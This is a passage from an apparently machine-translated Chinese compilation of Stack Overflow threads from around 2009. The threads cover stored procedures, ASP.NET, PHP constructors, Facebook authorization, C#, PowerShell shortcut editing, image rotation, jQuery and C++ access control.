即使这种意识形态被广泛接受，我们仍然有诱惑力，并且在某些情况下，我们最终将一些决策和业务逻辑放入数据库中。关于为什么不应该这样做的详细答案值得一游，但在宏观层面上，我建议考虑一个很好的理由，为什么它应该留在存储过程而不是应用程序层。

拥有这种反思想过程总是会指导做出正确的决定。在决定之前问这些问题：

1.  如果我们将数据库从 SQL 更改为 Mongo 会怎样？
2.  如果想要公开获取数据（该数据库提供）的 API 并在顶部应用此业务逻辑怎么办？
3.  单元测试这个业务逻辑？
4.  如果我们更改此业务逻辑的条件，涉及到 SDLC 步骤？
5.  如果我们需要另一个用户输入来进行此业务逻辑中的决策怎么办？
6.  如果它需要高计算能力（不是数据处理）并且我们希望在单独的进程（或平台）上运行怎么办？

在所有情况下，不将任何逻辑（除了数据检索）放在业务逻辑中都是自然的选择。

* * *

## 回答 #17

> 赞同：-1
> 
> 时间：2013-08-07T15:07:03.377

通过将逻辑移动到存储过程中，性能将大大提高，尤其是在涉及显式事务的情况下。

以我的经验，应用程序开发人员不太擅长编写优化的数据库代码，并且不倾向于考虑并发性或性能问题。
如果业务逻辑保留在应用程序层中，您往往必须通过网络转移大量数据（通常是多次往返），将其复制到数据库服务器的内存中，并且至少在应用程序服务器中复制一次，并在您打开交易时在应用程序中进行大量的逐行处理。然后应用程序开发人员抱怨数据库速度慢并且不断死锁。

如果您将逻辑放在任何可能的数据库中，您往往只是通过网络传递一些参数，在您等待网络资源时不会保留事务，整个事情就像涂了油的闪电一样。数据库当然应该像任何其他源代码一样进入源代码控制。有很多工具可以做到这一点。

# asp.net - UpdatePanelAnimationExtender：单击某些按钮时没有动画

> ID：484520
> 
> 赞同：1
> 
> 时间：2009-01-27T18:04:56.920
> 
> 标签：asp.net, ajax, asp.net-ajax, ajaxcontroltoolkit

我在页面上执行搜索时填充的 UpdatePanel 中有一个 GridView。当它被填充或页面改变时，它会执行一个淡入淡出动画。我还想执行其他更新 UpdatePanel 的操作，但我不希望这些操作执行这些淡入淡出动画。我在 ASP 论坛上找到的最接近的是：[http ://forums.asp.net/p/1037038/1487096.aspx](http://forums.asp.net/p/1037038/1487096.aspx)

该线程中提出的解决方案的问题是无法捕获更新和更新事件以进行动画处理。有任何想法吗？

谢谢，

缺口

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T00:19:25.870

缺口，

是否可以考虑使用 JQuery 来制作动画？除了使用 UpdatePanelAnimationExtender 之外，您还可以更好地控制元素。

[http://jquery.com/](http://jquery.com/)

[http://docs.jquery.com/UI/Effects](http://docs.jquery.com/UI/Effects)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-03T21:39:16.557

只是想为这个答案添加一些代码，因为我设法使用来自不同地方的代码找到了一个很好的解决方案。:) （有些是粘贴的，有些是编辑过的；这个的最终版本没有经过测试，但你应该能够从中得到想法！）

```
var postbackElement; // Global to store the control that initiated the postback

// Using JQuery here
$(document).ready(function()
{
    Sys.WebForms.PageRequestManager.getInstance().add_beginRequest(beginRequest);
    Sys.WebForms.PageRequestManager.getInstance().add_pageLoaded(pageLoaded);
});

function beginRequest(sender, args)
{
    postbackElement = args.get_postBackElement();

    // This method can be used to do animations in place of OnUpdating

    if(postbackElement.id == "YourControlId")
    {
      // or something like: if(id == "<%= YourControl.ClientID %>")

      // run your animation here
    }
}

function pageLoaded(sender, args)
{
    // This method can be used to do animations in place of OnUpdated

    // Also, the args variable holds a list of panels that are being updated;
    // I didn't use this though.

    // This condition is true on the first page load
    if (typeof(postbackElement) === "undefined")
    {
        return;
    }

    if(postbackElement.id == "YourControlId")
    {
      // run your animation here
    }
} 
```

# php - 在php中初始化一个类时，如何将变量传递给该类以在其函数中使用？

> ID：484537
> 
> 赞同：43
> 
> 时间：2009-01-27T18:10:17.253
> 
> 标签：php, variables, class

所以这里是交易。我想调用一个类并将一个值传递给它，以便它可以在该类中的所有各种函数等中使用。等等。我该怎么做呢？

谢谢，山姆

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2009-01-27T18:14:29.507

> 我想调用一个类并向它传递一个值，以便它可以在该类中使用

这个概念被称为“构造函数”。

正如其他答案所指出的，您应该使用PHP 5 起[的统一构造函数语法](http://php.net/manual/en/language.oop5.decon.php)( `__construct()`)。下面是一个示例：

```
class Foo {
    function __construct($init_parameter) {
        $this->some_parameter = $init_parameter;
    }
}

// in code:

$foo = new Foo("some init value"); 
```

* * *

**注意**- 您可能会在遗留代码中遇到所谓的旧式构造函数。它们看起来像这样：

```
class Foo {
    function Foo($init_parameter) {
        $this->some_parameter = $init_parameter;
    }
} 
```

**自 PHP 7 起正式弃用此表单，您不应再将其用于新代码。**

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2009-01-27T18:17:13.917

在 PHP 的新版本（5 及更高版本）中，每当您使用“new {Object}”时都会调用函数 __constuct，因此如果要将数据传递给对象，请在构造函数中添加参数，然后调用

```
$obj = new Object($some, $parameters);

class Object {
    function __construct($one, $two) {}
} 
```

PHP 正在逐步淘汰命名构造函数，取而代之的是 __construct 方法。

* * *

## 回答 #3

> 赞同：23
> 
> 时间：2010-10-01T02:08:31.277

```
class SomeClass
{
    public $someVar;
    public $otherVar;

    public function __construct()
    {
        $arguments = func_get_args();

        if(!empty($arguments))
            foreach($arguments[0] as $key => $property)
                if(property_exists($this, $key))
                    $this->{$key} = $property;
    }
}

$someClass = new SomeClass(array('someVar' => 'blah', 'otherVar' => 'blahblah'));
print $someClass->someVar; 
```

从长远来看，这意味着更少的维护。

传递变量的顺序不再重要，（不再像'null'这样写默认值：someClass（null，null，true，false））

添加新变量更省事（不必在构造函数中写赋值）

当您查看类的实例化时，您会立即知道传入的变量与什么相关：

```
Person(null, null, true, false) 
```

对比

```
Person(array('isFat' => true, 'canRunFast' => false)) 
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2009-11-14T07:07:53.630

这就是我做我的方式

```
class MyClass {

       public variable;  //just declaring my variables first (becomes 5)
       public variable2; //the constructor will assign values to these(becomes 6)

       function __construct($x, $y) {
            $this->variable  = $x;
            $this->variable2 = $y;
       }

       function add() {
            $sum = $this->variable + $this->variable2
            return $sum;
       }

} //end of MyClass class 
```

创建一个实例，然后调用函数 add

```
$myob = new MyClass(5, 6); //pass value to the construct function
echo $myob->add(); 
```

11 将被写入页面不是一个非常有用的示例，因为您希望在调用它时传递值以添加，但这说明了这一点。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-27T18:17:32.387

你可以这样做：

```
class SomeClass
{
   var $someVar;
   function SomeClass($yourValue)
   {
       $this->someVar = $yourValue;
   }

   function SomeFunction()
   {
       return 2 * $this->someVar;
   }
} 
```

或者您可以在 php5 中使用 __construct 而不是 SomeClass 作为构造函数。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-10-19T01:12:36.293

认为每个人都在这里遗漏了明显的东西。是的，不推荐使用 PHP4 构造函数，但您可以将类编写为向后兼容，如下所示：

```
class myClass {

    var $myVar;

    function myClass { // PHP4 constructor, calls PHP5 constructor
        $this->__construct();
    }

    function __construct() { // PHP5 constructor
        doSomeStuff($myVar);
    }
} 
```

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2011-02-21T16:37:16.877

哇，我不敢相信这里的答案！它们都可以工作，但都是错误的，设置变量的正确方法是通过 getter 和 setter，这使您可以整齐地设置变量并对它们执行检查等。例如

```
class myClass {

    private $myVar;

    public function set_var($var) {  // You can then perform check on the data etc here
       $this->myVar = $var;
    }

    function __construct() { // PHP5 constructor

    }

    public function do_something() {
        echo "blah";
    } 

} 
```

这允许您做的是正确调用对象，例如

```
$objNew = new myClass();
$objNew->set_var("Set my variable");
$objNew->do_something(); 
```

这是一种整洁的方式，在大型项目和脚本上，你会很高兴，我现在遇到了一些其他脚本的问题，该脚本无法轻松更新，因为它是用本文中提到的其他方式编写的页。

它还允许您为类拥有无限数量的变量，而无需对对象进行愚蠢的调用，例如

```
$objNew = new myClass("var1","var1","var1","var1","var1","var1","var1","var1","var1","var1","var1","var1","var1","var1","var1","var1","var1"); 
```

这基本上并不比使用函数更清楚。

# php - 脸书授权问题

> ID：484550
> 
> 赞同：3
> 
> 时间：2009-01-27T18:14:05.577
> 
> 标签：php, facebook, authorization

我正在开发一个 facebook 应用程序，我只是不了解他们的授权系统是如何工作的。

我们的基本设置是这样的

画布 URL = domain.com/facebook

这是一个简单的页面，其中包含一个指向 domain.com/facebook/app 的 FBML Iframe 元素，这是一个提供 Flash 应用程序的 HTML 页面。

Flash 应用程序从我们的应用程序服务器请求其他数据——其中一些请求请求 Facebook 数据（例如朋友 ID 列表）。

因此，Flash 然后向 domain.com/resources/facebook/friends 发出请求——这是一个 PHP 页面，它创建一个 Facebook 实例（他们的 PHP 库）并对其 API 执行必要的调用并返回数据。

但是，对这个 URL 的请求（通过 flash）没有验证，因此当它本身使用两个参数（**auth_token**和**next** ）重定向回我的画布 URL 时，它会被重定向到他们的登录名。所以请求是有效的，但是重定向会中断 flash 调用。

所以，我试图弄清楚如何让这些其他 API 调用（当他们自己 mace facebook API 调用时）从一开始就被 facebook-vaildated。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T20:55:26.543

好的，我想通了。

事实证明，Flash 已经遵循了重定向——我需要做的就是检测（在画布 URL 上）是否有授权请求（注意存在**auth_token**和**next**），并在我将 auth_token 作为 GET 参数*包含*在内重定向到下一个 URL（基本上，将 auth_token 转发到原始请求）。

因此，与我上面所说的相反，重定向并没有中断 flash 调用——它只是没有足够的数据成为有效请求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-01-24T20:01:01.207

通过将代码放在下面而不是“require_login()”行来解决

```
if (isset($_GET['auth_token'])) {
 $sess_data=$facebook->api_client->call_method('auth.getSession',array('auth_token'=>$_GET['auth_token']));
 $facebook->set_user($sess_data['uid'],$sess_data['session_key'],$sess_data['expires']);
 $user=$sess_data['uid'];
}
if (!$sess_data) {
 $user=$facebook->require_login();
} 
```

# c# - 您如何扩展（或可以扩展）静态数学方法？

> ID：484557
> 
> 赞同：12
> 
> 时间：2009-01-27T18:15:06.120
> 
> 标签：c#, extension-methods

在 C# 3.0 中，我知道您可以使用“this”命名法来扩展方法。

我正在尝试扩展 Math.Cos(double radians) 以包含我的新课程。我知道我可以在我现有的课程中创建一个“Cos”方法，但我只是想看看如何/是否可以为了练习而做到这一点。

在尝试了一些新事物之后，我将返回 SO 以获取输入。我被困住了。

这就是我目前所拥有的......

```
public class EngMath
{
    /// ---------------------------------------------------------------------------
    /// Extend the Math Library to include EngVar objects.
    /// ---------------------------------------------------------------------------

    public static EngVar Abs(this Math m, EngVar A)
    {
        EngVar C = A.Clone();

        C.CoreValue = Math.Abs(C.CoreValue);

        return C;
    }

    public static EngVar Cos(this Math m, EngVar A)
    {
        EngVar C = A.Clone();
        double Conversion = 1;
        // just modify the value. Don't modify the exponents at all

        // is A degrees? If so, convert to radians.
        if (A.isDegrees) Conversion = 180 / Math.PI;

        C.CoreValue = Math.Cos(A.CoreValue * Conversion);

        // if A is degrees, convert BACK to degrees.
        C.CoreValue *= Conversion;

        return C;
    }

    ... 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-01-27T18:18:08.360

扩展方法是一种使您的静态方法看起来是它们“扩展”类型的实例方法的方法。换句话说，您需要某个事物的实例才能使用扩展方法功能。

在我看来，您试图通过让 Math.Cos 处理您的类型来以相反的方式进行处理。在那种情况下，恐怕您必须自己实现该功能。如果这不是你想要做的，请澄清。

# powershell - 使用 Powershell 编辑快捷方式 (.lnk) 属性

> ID：484560
> 
> 赞同：37
> 
> 时间：2009-01-27T18:15:55.587
> 
> 标签：powershell, file, shortcuts

我找到了一种讨厌的 VBS 方法来执行此操作，但我正在寻找一个本地 PoSh 程序来编辑 .LNK 文件的属性。目标是联系远程机器，复制具有大多数正确属性的现有快捷方式，并编辑其中的几个。

如果编写新的快捷方式文件更容易，那也可以。

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2009-02-10T21:59:28.513

```
Copy-Item $sourcepath $destination  ## Get the lnk we want to use as a template
$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut($destination)  ## Open the lnk
$shortcut.TargetPath = "C:\path\to\new\exe.exe"  ## Make changes
$shortcut.Description = "Our new link"  ## This is the "Comment" field
$shortcut.Save()  ## Save 
```

在此处找到代码的 VB 版本： [http ://www.tutorialized.com/view/tutorial/Extract-the-target-file-from-a-shortcut-file-.lnk/18349](http://www.tutorialized.com/view/tutorial/Extract-the-target-file-from-a-shortcut-file-.lnk/18349)

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2014-02-23T11:24:54.557

以下是我用于处理 .lnk 文件的函数。它们是@Nathan Hartley 提到的[此处找到的函数的修改版本。](http://powershell.com/cs/media/p/7895.aspx)我改进`Get-Shortcut`了处理通配符的方法，例如`*`通过传递字符串以`dir`将它们扩展为 FileInfo 对象集。

```
function Get-Shortcut {
  param(
    $path = $null
  )

  $obj = New-Object -ComObject WScript.Shell

  if ($path -eq $null) {
    $pathUser = [System.Environment]::GetFolderPath('StartMenu')
    $pathCommon = $obj.SpecialFolders.Item('AllUsersStartMenu')
    $path = dir $pathUser, $pathCommon -Filter *.lnk -Recurse 
  }
  if ($path -is [string]) {
    $path = dir $path -Filter *.lnk
  }
  $path | ForEach-Object { 
    if ($_ -is [string]) {
      $_ = dir $_ -Filter *.lnk
    }
    if ($_) {
      $link = $obj.CreateShortcut($_.FullName)

      $info = @{}
      $info.Hotkey = $link.Hotkey
      $info.TargetPath = $link.TargetPath
      $info.LinkPath = $link.FullName
      $info.Arguments = $link.Arguments
      $info.Target = try {Split-Path $info.TargetPath -Leaf } catch { 'n/a'}
      $info.Link = try { Split-Path $info.LinkPath -Leaf } catch { 'n/a'}
      $info.WindowStyle = $link.WindowStyle
      $info.IconLocation = $link.IconLocation

      New-Object PSObject -Property $info
    }
  }
}

function Set-Shortcut {
  param(
  [Parameter(ValueFromPipelineByPropertyName=$true)]
  $LinkPath,
  $Hotkey,
  $IconLocation,
  $Arguments,
  $TargetPath
  )
  begin {
    $shell = New-Object -ComObject WScript.Shell
  }

  process {
    $link = $shell.CreateShortcut($LinkPath)

    $PSCmdlet.MyInvocation.BoundParameters.GetEnumerator() |
      Where-Object { $_.key -ne 'LinkPath' } |
      ForEach-Object { $link.$($_.key) = $_.value }
    $link.Save()
  }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-28T03:20:41.463

我不认为有本土的方式。

有这个 DOS 工具：[Shortcut.exe](http://www.optimumx.com/download/Shortcut.zip)。

您仍然需要将 util 复制到远程系统，然后可能使用 WMI 调用它来进行您正在寻找的更改。

我认为更简单的方法是覆盖和/或创建一个新文件。

您是否可以通过远程共享访问这些系统？

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2018-12-06T12:59:50.243

@JasonMArcher 的回答的简短补充..

要查看可用属性，您可以`$shortcut`在*PS*`$shortcut = $shell.CreateShortcut($destination)`中运行。这将打印所有属性及其当前值。

 *# c# - C#中var的初始化

> ID：484562
> 
> 赞同：2
> 
> 时间：2009-01-27T18:16:15.820
> 
> 标签：c#, winforms, linq, var

考虑下面的代码：

```
public IEnumerable <Country> ListPopulation()
{
    foreach(var continent in Continents)
    {
        var ids = context.continentTable
                   .where(y=>y.Name == continent.name)
                   .select(x=>x.countryId);

    }

    return GetPopulation(ids);// ids is not available here
}

Public IEnumerable<Country>GetPopulation(IQueryable<int> idnumbers)
{

} 
```

我怎样才能初始化**`var ids`**这样我可以用它来调用`GetPopulation()`？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-27T18:21:03.097

好吧，主要问题与使用“var”无关。您有一个 foreach 循环，其中声明了变量，然后您尝试使用该变量从循环*外部返回。*你期望的价值是多少？

如果您尝试选择*所有*国家/地区，为什么不这样做：

```
public IEnumerable <Country> ListPopulation()
{
    return GetPopulation(context.continentTable.Select(x => x.countryId));
} 
```

遍历每个大陆有什么意义？或者您未显示的 Continents 属性未引用 continents 中的国家/地区？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T18:25:26.987

我认为您以非最佳方式使用 LINQ

```
var ids = from c in context.continetTable
          select c.countryId 
```

然后根据这些 id 查找，但是我不知道您的数据模型，但如果您的内容和国家/地区表是链接的，这样做会更容易。

```
public IEnumerable <Country> ListPopulation()
{
    return from c in context.contentTable
           select c.Country;
} 
```

属性 Country 是基于 CountryId 值的属性。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-27T20:03:15.543

您可能应该遵循 Jon Skeet 或 Nick Berardi 的建议并制定更好的查询，但如果您确实有充分的理由这样做，这里是您实际问题的答案：

为了能够在离开循环范围后访问变量*ids*，您必须在外部声明它。但是你不能使用*var*关键字，除非你在声明它时分配给它。所以你必须明确声明类型：

```
public IEnumerable <Country> ListPopulation()
{
  IQueryable<Country> ids;
  foreach(var continent in Continents)
  {
    var ids = context.continentTable
              .Where(y=>y.Name == continent.Name)
              .Select(x=>x.countryId);
  }

  return GetPopulation(ids);
} 
```

# c# - 如何在 C# 中证明一个方法永远不会返回 null（按合同设计）

> ID：484571
> 
> 赞同：10
> 
> 时间：2009-01-27T18:18:29.653
> 
> 标签：c#, design-by-contract

我有一个从不返回空对象的方法。我想澄清一下，这样我的 API 的用户就不必编写这样的代码：

```
if(Getxyz() != null)
{
  // do stuff
} 
```

我怎样才能表现出这种意图？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-27T18:25:09.827

不幸的是，没有办法内置到 C#

您可以记录这一事实，但这不会被自动检查。

如果您使用的是 resharper，则可以将其设置为在方法标记有 [NotNull] 属性时正确检查。

否则，您可以使用 [Microsoft Contracts][1] 库并在您的方法中添加类似于以下内容的内容，但对于这样一个简单的注释来说，这是相当多的多余的措辞。

```
Contract.Ensures(Contract.Result<string>() != null) 
```

Spec# 通过允许 ! 在类型之后将其标记为非空类型，例如

```
string! foo 
```

但是 Spec# 只能用于面向 .NET2，并且已被 Code Contracts 库篡夺。[1]：[http ://research.microsoft.com/en-us/projects/contracts/](http://research.microsoft.com/en-us/projects/contracts/)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-27T18:21:15.623

除非您使用基于 System.ValueType 的类型，否则我认为您不走运。最好在函数的 XML/元数据注释中清楚地记录这一点。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-27T18:25:44.023

我不知道是否有从 API 执行此操作的最佳实践，因为我仍然会进行防御性编程并检查 null 作为消费者。我认为这仍然是这种情况下的最佳实践，因为我倾向于不相信其他代码总是做正确的事情。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-27T19:02:56.570

确保 C# 对象从不返回 null 的唯一类型检查方法是使用结构。结构可以有包含空值的成员，但它们本身永远不能为空。

所有其他 C# 对象都可以为空。

示例代码：

```
public struct StructExample
{
    public string Val;
}

public class MyClass
{
    private StructExamle example;

    public MyClass()
    {
        example = null; // will give you a 'Cannot convert to null error
    }

    public StructExample GetXyz()
    {
        return null; // also gives the same error
    }
} 
```

上面的例子不会编译。如果使用结构是可以接受的（它成为一种值类型，在堆栈上传递，不能被子类化）那么这可能对你有用。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-27T18:49:52.867

我喜欢反过来想：如果我的函数可以返回一个空值，我最好确保函数的用户知道它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-27T18:22:38.273

如果您的用户有您的源代码，使用标准按合同设计 API，例如： http: [//www.codeproject.com/KB/cs/designbycontract.aspx](http://www.codeproject.com/KB/cs/designbycontract.aspx)可以让事情变得清晰。

否则，您最好的选择是通过文档。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-27T18:25:06.707

要么很好地记录它（可能使用 .NET 标准文档系统），要么你必须使用一些 Contract API。这里有一些： http: [//geekswithblogs.net/Podwysocki/archive/2008/01/22/118770.aspx](http://geekswithblogs.net/Podwysocki/archive/2008/01/22/118770.aspx) [http://www.codeproject.com/KB/cs/designbycontract.aspx](http://www.codeproject.com/KB/cs/designbycontract.aspx)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-27T18:25:35.630

您可以包含一个 Debug.Assert() 方法。虽然这肯定不会强制执行该条件，但它应该明确（连同文档）空值是不可接受的。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-27T18:33:07.533

记录它并提供源代码。

# algorithm - 图像旋转算法

> ID：484573
> 
> 赞同：19
> 
> 时间：2009-01-27T18:19:52.943
> 
> 标签：algorithm, optimization, java-me, image-manipulation, midp

我正在寻找一种将图像旋转一定程度（输入）的算法。

```
public Image rotateImage(Image image, int degrees) 
```

（图像实例可以用包含每个像素 RGB 值的 int[] 替换，我的问题是我需要为 JavaME MIDP 2.0 项目实现它，所以我必须使用 1.5 版之前可在 JVM 上运行的代码 谁能帮我解决这个问题?

编辑：我忘了提到我没有可用的 SVG API，我需要一种方法来旋转 90-180-270 以外的任意角度

此外，MIDP 2.0 上没有可用的 java.awt.* 包

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2009-01-27T18:33:16.707

我在互联网上找到的描述图像旋转算法的最佳页面之一与 Dan Bloomberg*出色*的leptonica 库有关。虽然 leptonica 库本身是用 C 语言编写的，对您没有帮助，但他关于图像旋转算法的页面：

[http://www.leptonica.org/rotation.html](http://www.leptonica.org/rotation.html)

绝对值得一读。您很可能希望实现类似于他在页面第二部分中描述的按区域映射算法的旋转。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-02-24T22:00:19.367

**一般解决方案：**对于目标图像中的每个像素点，取源图像中的像素点与目标像素点坐标，反方向旋转。

**解决方案的增强：**旋转通常不会给出精确的像素坐标。根据与它们重叠的百分比，对源像素与其相邻像素进行加权平均。

**二值图像的更快解决方案：**将图像转换为连续前景像素的“运行”。然后旋转这些线的端点并将它们绘制到目的地。

通常，由于整数舍入，这会产生微小的间隙，因此当一个或两个端点与整数的距离超过 10% 时，通过使用向上和向下舍入的整数坐标为单个源线绘制两条线来修补。

如果一个端点在 10% 以内而另一个不在，则两条线将形成“V”形。如果两者的偏差超过 10%，则两条线将形成“X”形。

这可以相对于 X 轴或 Y 轴来完成。使用轴和旋转角度之间夹角最小的那个。（即如果旋转角度在 45 到 -45 之间，则使用 X 轴。）

**二值图像的更快解决方案：**如果背景像素比前景像素少，则用前景填充目标，并按照上述算法使用背景像素。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2009-01-27T18:26:14.177

Graphics2D 和 AffineTransform 将帮助您做您想做的事。具体来说，Graphics2D.drawImage(Image, AffineTransform) 和 AffineTransform.getRotateInstance。您还可以使用它进行缩放、平移和剪切。这两个类至少从 1.4 版本开始就在运行时中，可能更早。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2010-05-15T14:47:18.483

```
 public Image rotateImage(Image img, float degrees){
   BufferedImage sourceBI = new BufferedImage(img.getWidth(null),img.getHeight(null),BufferedImage.TYPE_INT_ARGB);
   sourceBI.getGraphics().drawImage(img,0,0,null);
   AffineTransform at = new AffineTransform();
   at.rotate(degrees*Math.PI/180, sourceBI.getWidth()/2, sourceBI.getHeight()/2);
   BufferedImageOp bio = new AffineTransformOp(at, AffineTransformOp.TYPE_BILINEAR);
   return bio.filter(sourceBI, null);
  } 
```

# javascript - 如何使用 jQuery 使链接标题与其 URL 相同？

> ID：484577
> 
> 赞同：1
> 
> 时间：2009-01-27T18:20:03.440
> 
> 标签：javascript, jquery, html

我的目标是使每个外部链接的标题等于其 href 属性。

我的问题是，如何使`title`变量可用于`attr`函数？

```
$('a').filter(function() {

    var title= $(this).attr('href');
    return this.hostname && this.hostname !== location.hostname;

 })
    .removeAttr('target')
    .attr('rel', 'external')
    .attr('title', title);

$('a[rel="external"]').click( function() {
    window.open( $(this).attr('href') );
    return false;
}); 
```

我想我以某种方式倒退了，答案在[attr(key, fn)](http://docs.jquery.com/Attributes/attr#keyfn)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T18:21:15.437

```
$('a').each(function() {
    var href = $(this).attr('href');
    if(this.hostname && this.hostname !== location.hostname) {
        $(this).removeAttr('target')
               .attr('rel', 'external')
               .attr('title', href)
               .click(function() {
                   window.open(href);
                   return false;
               });
    } 
}); 
```

# c# - 有没有办法将 TextBox.Text 属性绑定到 Windows 窗体中的资源？

> ID：484585
> 
> 赞同：0
> 
> 时间：2009-01-27T18:22:32.657
> 
> 标签：c#, winforms

我有一系列控件，但主要是需要正确全球化的文本框和标签。有没有一种简单的方法可以将它们绑定到适当的资源文件，就像在 ASP.Net 中一样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T18:38:03.687

VS.NET 会自动为你处理。

选择作为主机的窗体/用户控件并将 Localizable 属性设置为 true。然后，将 Language 属性设置为您希望在表单上设置属性的语言（在这种情况下，您需要 Text，但您也可以更改不同语言环境的其他详细信息）。

以适当的语言设置区域设置的所有属性。

去切换语言，然后重复。

当语言不是默认时，您无法添加更多控件，因此只需将其设置回默认值，添加控件，然后在需要时切换到另一种语言。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T18:37:14.810

您应该能够使用 TextBox 的 DataBindings 属性。这是一个集合，所以你可以这样称呼它：

```
this.textBox1.DataBindings.Add("Text",myResourceFile,"MyResourceFileProperty"); 
```

不完全是，但你明白了。

[看这里](http://msdn.microsoft.com/en-us/library/system.windows.forms.controlbindingscollection.add(VS.71).aspx)

# c++ - 在 C++ 中用私有函数覆盖公共虚函数

> ID：484592
> 
> 赞同：58
> 
> 时间：2009-01-27T18:24:15.227
> 
> 标签：c++, overriding, access-control, virtual-functions

是否有任何理由使重写的 C++ 虚函数的权限不同于基类？这样做有什么危险吗？

例如：

```
class base {
    public:
        virtual int foo(double) = 0;
}

class child : public base {
    private:
        virtual int foo(double);
} 
```

[C++ 常见问题解答](https://isocpp.org/wiki/faq/proper-inheritance#hiding-inherited-public)说这是一个坏主意，但没有说明原因。

我在一些代码中看到了这个习语，我相信作者试图使这个类成为最终的，基于不可能覆盖私有成员函数的假设。然而，[这篇文章](http://www.gotw.ca/publications/mill18.htm)展示了一个重写私有函数的例子。当然[，C++ 常见问题的另一部分](http://www.parashift.com/c++-faq-lite/strange-inheritance.html#faq-23.4)建议不要这样做。

我的具体问题：

1.  在派生类和基类中对虚拟方法使用不同的权限是否有任何技术问题？

2.  有任何正当理由这样做吗？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2009-01-27T18:27:21.647

你确实得到了令人惊讶的结果，如果你有一个孩子，你不能调用 foo，但你可以将它转换为一个基数，然后调用 foo。

```
child *c = new child();
c->foo; // compile error (can't access private member)
static_cast<base *>(c)->foo(); // this is fine, but still calls the implementation in child 
```

我想您可能可以设计一个不希望公开函数的示例，除非您将其视为基类的实例。但是，这种情况出现的事实表明，在某处可能应该重构一个糟糕的 OO 设计。

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2009-01-27T19:00:40.363

问题是基类方法是它声明其接口的方式。它本质上是在说，“这些是你可以对这个类的对象做的事情。”

在派生类中，您将 Base 声明为公有私有的某些内容设置为带走某些内容。现在，即使 Derived 对象“是”Base 对象，您应该能够对 Base 类对象执行的操作却不能对 Derived 类对象执行，从而打破了[Liskov 替换原则](http://en.wikipedia.org/wiki/Liskov_substitution_principle)

这会在您的程序中导致“技术”问题吗？也许不吧。但这可能意味着您的类的对象不会以您的用户期望的方式运行。

如果您发现自己处于您想要的情况（除了另一个答案中提到的已弃用方法的情况），那么您很可能有一个继承模型，其中继承并不是真正建模“is-a”（例如，Scott Myers 的示例 Square 继承自 Rectangle，但您不能像矩形那样独立于其高度来更改 Square 的宽度）并且您可能需要重新考虑您的类关系。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-01-27T18:26:46.017

没有技术问题，但您最终会遇到这样一种情况，即公开可用的函数将取决于您是否具有基指针或派生指针。

在我看来，这将是奇怪和令人困惑的。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-27T19:17:44.090

如果您使用私有继承，它会非常有用——即您想重用基类的（定制）功能，而不是接口。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-27T18:41:57.797

这是可以做到的，而且非常偶尔会带来好处。例如，在我们的代码库中，我们正在使用一个库，其中包含一个具有我们过去使用的公共函数的类，但现在由于其他潜在问题不鼓励使用（有更安全的方法可以调用）。我们也碰巧有一个派生自该类的类，我们的很多代码都直接使用它。因此，我们在派生类中将给定函数设为私有，以帮助每个人记住，如果他们能提供帮助，就不要使用它。它不会消除使用它的能力，但它会在代码尝试编译时捕获一些用途，而不是稍后在代码审查中。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-27T18:42:02.150

1.  没有技术问题，如果您指的是技术，因为存在隐藏的运行时成本。
2.  如果你公开继承 base，你不应该这样做。如果您通过受保护或私有继承，那么这有助于防止使用没有意义的方法，除非您有一个基指针。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-01-05T19:26:40.993

私有继承的一个很好的用例是 Listener/Observer 事件接口。

私有对象的示例代码：

```
class AnimatableListener {
  public:
    virtual void Animate(float delta_time);
};

class BouncyBall : public AnimatableListener {
  public:
    void TossUp() {}
  private:
    void Animate(float delta_time) override { }
}; 
```

对象的一些用户想要父功能，而一些用户想要子功能：

```
class AnimationList {
   public:
     void AnimateAll() {
       for (auto & animatable : animatables) {
         // Uses the parent functionality.
         animatable->Animate();
       }
     }
   private:
     vector<AnimatableListener*> animatables;
};

class Seal {
  public:
    void Dance() {
      // Uses unique functionality.
      ball->TossUp();
    }
  private:
    BouncyBall* ball;
}; 
```

